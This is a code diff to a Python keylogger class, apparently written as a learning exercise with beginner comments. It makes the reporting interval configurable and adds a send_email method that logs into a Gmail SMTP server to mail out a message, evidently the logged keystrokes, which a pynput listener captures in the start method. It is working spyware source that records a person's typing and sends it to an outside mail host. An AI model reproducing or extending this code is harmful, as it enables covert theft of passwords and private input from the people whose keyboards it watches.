@@ -30,9 +30,20 @@ class Keylogger: #class names start with capital letter conventionally
     def report(self):
         print(self.log)
         self.log = " "
-        timer = threading.Timer(10, self.report) #recursive function - report calls itself
+        timer = threading.Timer(self.interval, self.report) #recursive function - report calls itself
+        #replace hardcoded int time with self.interval - instantiated number invoked when passed in from user
+        #in other program, keylog_class.py
+        #timer = threading.Timer(10, self.report) #recursive function - report calls itself
         timer.start()
-    
+
+    def send_email(self, email, password, message): #is now a method with Keylogger class, so self has to be passed
+        server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        #(from_addr, to_addr, message)
+        server.quit()
+
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press = self.process_keypress)
         #create listener object from pynput and store as var
